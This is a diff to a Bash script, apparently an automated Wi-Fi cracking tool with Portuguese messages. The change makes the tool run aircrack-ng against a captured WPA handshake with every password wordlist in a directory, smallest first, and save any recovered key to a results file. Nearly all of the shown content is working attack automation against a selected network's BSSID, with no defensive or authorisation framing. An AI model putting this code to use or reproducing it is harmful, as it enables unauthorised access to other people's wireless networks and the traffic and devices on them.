@@ -33,7 +33,7 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 TIMESTAMP=$(date +%Y%m%d_%H%M%S)
 OUTPUT_DIR="${SCRIPT_DIR}/capturas"
 RESULTS_DIR="${SCRIPT_DIR}/resultados"
-WORDLIST_DIR="${SCRIPT_DIR}/../Kali/Ferramentas/wordlists/wordlists/passwords/xato_net_passwords.txt"
+WORDLIST_DIR="${SCRIPT_DIR}/../Kali/Ferramentas/wordlists/wordlists/passwords"
 
 # Variáveis globais
 INTERFACE=""
@@ -43,7 +43,9 @@ SELECTED_BSSID=""
 SELECTED_CHANNEL=""
 SELECTED_ESSID=""
 CAPTURE_FILE=""
-WORDLIST=""
+WORDLIST_ARRAY=()
+WORDLISTS_TOTAL=0
+WORDLISTS_TESTED=0
 PASSWORD_FOUND=false
 PASSWORD=""
 
@@ -218,19 +220,19 @@ enable_monitor_mode() {
     echo -e "${GREEN}[+] Modo monitor ativado: $MONITOR_INTERFACE${NC}"
 }
 
-# Encontrar maior wordlist de passwords
-find_largest_wordlist() {
-    echo -e "${BLUE}[*] Procurando maior wordlist de passwords...${NC}"
+# Encontrar todas as wordlists de passwords e ordenar por tamanho
+find_all_wordlists() {
+    echo -e "${BLUE}[*] Procurando todas as wordlists de passwords...${NC}"
     
     if [[ ! -d "$WORDLIST_DIR" ]]; then
         echo -e "${RED}[!] Diretório de wordlists não encontrado: $WORDLIST_DIR${NC}"
         exit 1
     fi
     
-    local largest_file=""
-    local largest_size=0
+    local wordlist_array=()
+    local temp_file="/tmp/wordlists_sorted_$$.txt"
     
-    # Procurar arquivos .txt na pasta passwords
+    # Encontrar todos os arquivos .txt e criar lista com tamanhos
     while IFS= read -r file; do
         [[ -z "$file" ]] && continue
         
@@ -241,26 +243,54 @@ find_largest_wordlist() {
             size=$(stat -c%s "$file" 2>/dev/null)
         fi
         
-        if [[ -n "$size" && $size -gt $largest_size ]]; then
-            largest_size=$size
-            largest_file="$file"
+        if [[ -n "$size" && $size -gt 0 ]]; then
+            echo "$size|$file" >> "$temp_file"
         fi
     done < <(find "$WORDLIST_DIR" -type f -name "*.txt" 2>/dev/null)
     
-    if [[ -z "$largest_file" ]]; then
+    if [[ ! -f "$temp_file" ]] || [[ ! -s "$temp_file" ]]; then
         echo -e "${RED}[!] Nenhuma wordlist encontrada em: $WORDLIST_DIR${NC}"
         exit 1
     fi
     
-    local size_mb=$((largest_size / 1024 / 1024))
-    local line_count=$(wc -l < "$largest_file" 2>/dev/null | tr -d ' ')
+    # Ordenar por tamanho (menores primeiro) e extrair caminhos
+    # Usar mapfile para popular array corretamente
+    mapfile -t wordlist_array < <(sort -n -t'|' -k1 "$temp_file" | cut -d'|' -f2)
     
-    echo -e "${GREEN}[+] Maior wordlist encontrada:${NC}"
-    echo -e "${CYAN}    Arquivo: $(basename "$largest_file")${NC}"
-    echo -e "${CYAN}    Tamanho: ${size_mb} MB${NC}"
-    echo -e "${CYAN}    Linhas: ${line_count}${NC}"
+    rm -f "$temp_file"
     
-    WORDLIST="$largest_file"
+    WORDLIST_ARRAY=("${wordlist_array[@]}")
+    WORDLISTS_TOTAL=${#WORDLIST_ARRAY[@]}
+    
+    if [[ $WORDLISTS_TOTAL -eq 0 ]]; then
+        echo -e "${RED}[!] Nenhuma wordlist válida encontrada${NC}"
+        exit 1
+    fi
+    
+    echo -e "${GREEN}[+] Encontradas $WORDLISTS_TOTAL wordlists${NC}"
+    echo -e "${CYAN}[*] Ordenadas por tamanho (menores primeiro)${NC}"
+    echo ""
+    
+    # Mostrar primeiras 5 wordlists
+    echo -e "${YELLOW}Primeiras wordlists que serão testadas:${NC}"
+    local count=1
+    for wordlist in "${WORDLIST_ARRAY[@]:0:5}"; do
+        local size=0
+        if [[ "$OSTYPE" == "darwin"* ]]; then
+            size=$(stat -f%z "$wordlist" 2>/dev/null)
+        else
+            size=$(stat -c%s "$wordlist" 2>/dev/null)
+        fi
+        local size_mb=$((size / 1024 / 1024))
+        local line_count=$(wc -l < "$wordlist" 2>/dev/null | tr -d ' ')
+        echo -e "${CYAN}  [$count] $(basename "$wordlist") - ${size_mb} MB - ${line_count} linhas${NC}"
+        ((count++))
+    done
+    
+    if [[ $WORDLISTS_TOTAL -gt 5 ]]; then
+        echo -e "${CYAN}  ... e mais $((WORDLISTS_TOTAL - 5)) wordlists${NC}"
+    fi
+    echo ""
 }
 
 # Escanear redes Wi-Fi e mostrar lista
@@ -431,27 +461,37 @@ capture_handshake_auto() {
     CAPTURE_FILE="${CAPTURE_FILE}-01.cap"
 }
 
-# Quebrar senha com wordlist
-crack_password() {
-    if [[ ! -f "$CAPTURE_FILE" ]]; then
-        echo -e "${RED}[!] Arquivo de captura não encontrado${NC}"
-        return 1
+# Testar wordlist individual
+test_wordlist() {
+    local wordlist="$1"
+    local wordlist_name=$(basename "$wordlist")
+    
+    WORDLISTS_TESTED=$((WORDLISTS_TESTED + 1))
+    
+    echo ""
+    echo -e "${CYAN}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "${BLUE}[*] Testando wordlist [$WORDLISTS_TESTED/$WORDLISTS_TOTAL]: $wordlist_name${NC}"
+    echo -e "${CYAN}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    
+    # Mostrar informações da wordlist
+    local size=0
+    if [[ "$OSTYPE" == "darwin"* ]]; then
+        size=$(stat -f%z "$wordlist" 2>/dev/null)
+    else
+        size=$(stat -c%s "$wordlist" 2>/dev/null)
     fi
+    local size_mb=$((size / 1024 / 1024))
+    local line_count=$(wc -l < "$wordlist" 2>/dev/null | tr -d ' ')
     
-    echo -e "\n${BLUE}[*] Iniciando quebra de senha...${NC}"
-    echo -e "${CYAN}[*] Arquivo: $CAPTURE_FILE${NC}"
-    echo -e "${CYAN}[*] Wordlist: $(basename "$WORDLIST")${NC}"
-    echo -e "${YELLOW}[*] Isso pode levar muito tempo...${NC}\n"
-    
-    mkdir -p "$RESULTS_DIR"
-    local result_file="${RESULTS_DIR}/resultado_${SELECTED_ESSID}_${TIMESTAMP}.txt"
+    echo -e "${CYAN}[*] Tamanho: ${size_mb} MB | Linhas: ${line_count}${NC}"
+    echo ""
     
     # Executar aircrack-ng
     echo -e "${GREEN}[+] Executando aircrack-ng...${NC}"
-    echo -e "${CYAN}Comando: aircrack-ng -w \"$WORDLIST\" -b \"$SELECTED_BSSID\" \"$CAPTURE_FILE\"${NC}\n"
+    echo -e "${CYAN}Comando: aircrack-ng -w \"$wordlist\" -b \"$SELECTED_BSSID\" \"$CAPTURE_FILE\"${NC}\n"
     
-    # Capturar output
-    local aircrack_output=$(aircrack-ng -w "$WORDLIST" -b "$SELECTED_BSSID" "$CAPTURE_FILE" 2>&1 | tee /tmp/aircrack_output_$$.txt)
+    # Capturar output (redirecionar stderr também)
+    aircrack-ng -w "$wordlist" -b "$SELECTED_BSSID" "$CAPTURE_FILE" > /tmp/aircrack_output_$$.txt 2>&1
     
     # Verificar se senha foi encontrada
     if grep -qi "KEY FOUND\|KEY FOUND!" /tmp/aircrack_output_$$.txt 2>/dev/null; then
@@ -473,11 +513,14 @@ crack_password() {
         echo -e "${CYAN}ESSID: ${BOLD}${GREEN}$SELECTED_ESSID${NC}${CYAN}${NC}"
         echo -e "${CYAN}BSSID: $SELECTED_BSSID${NC}"
         echo -e "${CYAN}Senha: ${BOLD}${GREEN}$PASSWORD${NC}${CYAN}${NC}"
-        echo -e "${CYAN}Wordlist: $(basename "$WORDLIST")${NC}"
+        echo -e "${CYAN}Wordlist: $wordlist_name${NC}"
+        echo -e "${CYAN}Wordlists testadas: $WORDLISTS_TESTED/$WORDLISTS_TOTAL${NC}"
         echo -e "${GREEN}${BOLD}═══════════════════════════════════════════════════════════${NC}"
         echo ""
         
         # Salvar resultado
+        mkdir -p "$RESULTS_DIR"
+        local result_file="${RESULTS_DIR}/resultado_${SELECTED_ESSID}_${TIMESTAMP}.txt"
         {
             echo "═══════════════════════════════════════════════════════════"
             echo "            SENHA ENCONTRADA - WIFITE AUTO"
@@ -487,18 +530,88 @@ crack_password() {
             echo "BSSID: $SELECTED_BSSID"
             echo "Canal: $SELECTED_CHANNEL"
             echo "Senha: $PASSWORD"
-            echo "Wordlist: $WORDLIST"
+            echo "Wordlist: $wordlist"
+            echo "Wordlist (nome): $wordlist_name"
+            echo "Wordlists testadas: $WORDLISTS_TESTED/$WORDLISTS_TOTAL"
             echo "Arquivo .cap: $CAPTURE_FILE"
             echo "═══════════════════════════════════════════════════════════"
         } > "$result_file"
         
         echo -e "${GREEN}[+] Resultado salvo em: $result_file${NC}"
-    else
-        echo -e "${RED}[!] Senha não encontrada na wordlist${NC}"
-        echo -e "${YELLOW}[*] A senha pode não estar na wordlist ou ser muito complexa${NC}"
+        
+        rm -f /tmp/aircrack_output_$$.txt
+        return 0
     fi
     
     rm -f /tmp/aircrack_output_$$.txt
+    return 1
+}
+
+# Quebrar senha testando todas as wordlists
+crack_password() {
+    if [[ ! -f "$CAPTURE_FILE" ]]; then
+        echo -e "${RED}[!] Arquivo de captura não encontrado${NC}"
+        return 1
+    fi
+    
+    if [[ ${#WORDLIST_ARRAY[@]} -eq 0 ]]; then
+        echo -e "${RED}[!] Nenhuma wordlist carregada${NC}"
+        return 1
+    fi
+    
+    echo -e "\n${BLUE}[*] Iniciando quebra de senha...${NC}"
+    echo -e "${CYAN}[*] Arquivo: $CAPTURE_FILE${NC}"
+    echo -e "${CYAN}[*] Total de wordlists: $WORDLISTS_TOTAL${NC}"
+    echo -e "${YELLOW}[*] Testando wordlists em ordem (menores primeiro)${NC}"
+    echo -e "${YELLOW}[*] Isso pode levar muito tempo...${NC}\n"
+    
+    WORDLISTS_TESTED=0
+    PASSWORD_FOUND=false
+    
+    # Testar cada wordlist
+    for wordlist in "${WORDLIST_ARRAY[@]}"; do
+        if [[ "$PASSWORD_FOUND" == true ]]; then
+            break
+        fi
+        
+        test_wordlist "$wordlist"
+        
+        # Pequena pausa entre wordlists
+        sleep 1
+    done
+    
+    # Resultado final
+    echo ""
+    if [[ "$PASSWORD_FOUND" == true ]]; then
+        echo -e "${GREEN}[+] Quebra de senha concluída com sucesso!${NC}"
+        echo -e "${GREEN}[+] Senha encontrada: $PASSWORD${NC}"
+    else
+        echo -e "${RED}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+        echo -e "${RED}[!] Senha não encontrada após testar $WORDLISTS_TESTED wordlists${NC}"
+        echo -e "${RED}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+        echo -e "${YELLOW}[*] Possíveis causas:${NC}"
+        echo -e "${YELLOW}    - A senha não está em nenhuma wordlist testada${NC}"
+        echo -e "${YELLOW}    - A senha é muito complexa/forte${NC}"
+        echo -e "${YELLOW}    - O handshake pode estar incompleto${NC}"
+        
+        # Salvar relatório de falha
+        mkdir -p "$RESULTS_DIR"
+        local result_file="${RESULTS_DIR}/senha_nao_encontrada_${SELECTED_ESSID}_${TIMESTAMP}.txt"
+        {
+            echo "═══════════════════════════════════════════════════════════"
+            echo "         SENHA NÃO ENCONTRADA - WIFITE AUTO"
+            echo "═══════════════════════════════════════════════════════════"
+            echo "Data: $(date)"
+            echo "ESSID: $SELECTED_ESSID"
+            echo "BSSID: $SELECTED_BSSID"
+            echo "Canal: $SELECTED_CHANNEL"
+            echo "Total de wordlists testadas: $WORDLISTS_TESTED"
+            echo "Arquivo .cap: $CAPTURE_FILE"
+            echo "═══════════════════════════════════════════════════════════"
+        } > "$result_file"
+        
+        echo -e "${CYAN}[*] Relatório salvo em: $result_file${NC}"
+    fi
 }
 
 # Restaurar interface ao modo normal
@@ -534,8 +647,8 @@ main() {
     detect_interface
     enable_monitor_mode
     
-    # Encontrar maior wordlist
-    find_largest_wordlist
+    # Encontrar todas as wordlists
+    find_all_wordlists
     
     # Loop principal
     while true; do
